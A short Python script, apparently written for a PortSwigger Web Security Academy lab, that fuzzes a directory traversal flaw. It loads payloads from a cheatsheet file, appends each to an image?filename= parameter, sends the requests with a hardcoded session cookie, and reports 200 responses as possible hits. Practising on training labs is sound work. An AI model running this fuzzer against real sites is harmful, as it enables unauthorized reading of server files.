import requests

# URL mục tiêu
BASE_URL = "https://0ae400eb03aa9b79a377161100320088.web-security-academy.net/image?filename="

# Cookie từ request của bạn
HEADERS = {
    "Cookie": "session=JEramfjCTALNyJsDtUMWV13PPUxV5hau",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "no-cors",
    "Sec-Fetch-Dest": "image",
    "Referer": "https://0ae400eb03aa9b79a377161100320088.web-security-academy.net/product?productId=2",
}

# File chứa các payloads
PAYLOADS_FILE = "cheatsheet.txt"

def load_payloads(file_path):
    """Đọc payloads từ file."""
    with open(file_path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def test_payloads(base_url, headers, payloads):
    """Kiểm tra payloads."""
    for payload in payloads:
        target_url = base_url + payload
        # print(f"[*] Testing: {target_url}")
        try:
            response = requests.get(target_url, headers=headers, timeout=5)
            # print(f"Status Code: {response.status_code}")
            if response.status_code == 200:
                print(f"[+] Possible vulnerability with payload: {payload}")
            # elif response.status_code in {403, 404}:
            #     print(f"[-] Payload blocked or not found: {payload}")
            # else:
            #     print(f"[?] Unexpected status code: {response.status_code}")
        except requests.RequestException as e:
            print(f"[!] Error testing payload {payload}: {e}")

def main():
    payloads = load_payloads(PAYLOADS_FILE)
    if not payloads:
        print("[!] No payloads found in the cheatsheet file.")
        return
    
    print("[*] Starting directory traversal tests...")
    test_payloads(BASE_URL, HEADERS, payloads)

if __name__ == "__main__":
    main()
